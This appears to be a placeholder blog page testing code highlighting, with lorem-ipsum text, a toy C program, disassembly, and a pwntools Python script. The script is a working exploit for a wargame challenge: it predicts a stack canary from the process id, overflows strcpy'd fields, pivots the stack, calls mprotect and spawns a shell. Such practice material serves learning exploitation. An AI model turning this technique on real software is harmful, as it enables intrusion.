---
title: "Example-zxc 2"
---
<link rel="stylesheet" href="/style.css">

# asd
## qew
Inventore doloremque eaque iusto et reiciendis vel provident rem. Eligendi qui iure assumenda et iusto placeat mollitia laudantium. Molestias cum dolores ut. Reiciendis ex quis sed provident velit labore magnam
```c
#include <stdio.h>
// Inventore doloremque eaque iusto et reiciendis vel provident rem. Eligendi qui iure assumenda et iusto placeat mollitia laudantium. Molestias cum dolores ut. Reiciendis ex quis sed provident velit labore magnam
typedef struct
{
    int x;
    int y;
} qwe;

int main(int argc, char** argv)
{
    char asd[][5] = { "Hola" };
    printf("%s %s\n", 0[asd], "mundo");
    qwe zxc;
    zxc.x = 1234;
    qwe* fgh = &zxc;
    fgh->y = 4321;
    printf("%i %i\n", zxc.x, zxc.y);
}
```

Un poco de python por aquí
```python
from pwn import *
import ctypes
# Inventore doloremque eaque iusto et reiciendis vel provident rem. Eligendi qui iure assumenda et iusto placeat mollitia laudantium. Molestias cum dolores ut. Reiciendis ex quis sed provident velit labore magnam
s = ssh(host='pwn.w3challs.com',
        user='canary',
        password='canary',
        port=10101)
p = s.process("./canary")
# p = process("canary")
e = ELF("canary")

dist_canary_pwd  = 0x46
dist_canary_user = 0x27
dist_ebp         = 0x56


pid = pidof(p)[0]
libc = ctypes.cdll.LoadLibrary("libc.so.6")
libc.srand(pid)

canary = list(p32(libc.rand()))
asd = libc.rand() % 4
canary[asd] = 0
canary = bytearray(canary)

log.info("Canary: %08x | 0x%08x" % (int.from_bytes(canary, "big"), \
                                    int.from_bytes(canary, "little")))

# user is strcpy'd in second place, so it's used to set the null of the canary
# and the preceding bytes
user = b''
user += b"A" * dist_canary_user
user += canary[:asd]

# password is strcpy'd first, therefore it goes all the way in
pwd = b''
pwd += b"A" * (dist_canary_pwd + asd + 1) # write the second part of the canary
pwd += canary[asd + 1:]
pwd += b"A" * (dist_ebp - len(pwd))
# in the stack we can't put nullbytes (strcpy) but in .bss we're read with
# gets(), so here we have our nulls, let's pivote the stack there
delta = len(user) + len(pwd) + 8 + 1
pwd += p32(0x804a080 + delta - 4) # ebp
pwd += p32(0x80488fc) # leave;ret

payload = user + b':' + pwd
# read in 0x804a080 + delta, after user:pwd
payload2  = b''
payload2 += p32(e.plt['mprotect'])
payload2 += p32(0x08048af9) # pop;pop;pop;ret
payload2 += p32(0x804a000)
payload2 += p32(0x1000)
payload2 += p32(constants.PROT_EXEC | constants.PROT_READ | constants.PROT_WRITE)
payload2 += p32(0x804a080 + delta + 0x80)
payload2 += b"A" * (0x80 - len(payload2))
payload2 += asm(shellcraft.i386.linux.setreuid32(1026, 1026) + \
               shellcraft.i386.linux.sh())

p.writeline(payload + payload2)

p.interactive()
```
Ensamblador
```nasm
__libc_csu_init:
    endbr64 
    push   r15
    lea    r15,[rip+0x2bfb]        ; 3de8 <__frame_dummy_init_array_entry>
    push   r14
    mov    r14,rdx
    push   r13
    mov    r13,rsi
    push   r12
    mov    r12d,edi
    push   rbp
    lea    rbp,[rip+0x2bec]        ; 3df0 <__do_global_dtors_aux_fini_array_entry>
    push   rbx
    sub    rbp,r15
    sub    rsp,0x8
    call   1000 <_init>
    sar    rbp,0x3
    je     1236 <__libc_csu_init+0x56>
    xor    ebx,ebx
    nop    DWORD PTR [rax+0x0]
    mov    rdx,r14
    mov    rsi,r13
    mov    edi,r12d
    call   QWORD PTR [r15+rbx*8]
    add    rbx,0x1
    cmp    rbp,rbx
    jne    1220 <__libc_csu_init+0x40>
    add    rsp,0x8
    pop    rbx
    pop    rbp
    pop    r12
    pop    r13
    pop    r14
    pop    r15
    ret    
    data16 nop WORD PTR cs:[rax+rax*1+0x0]
```
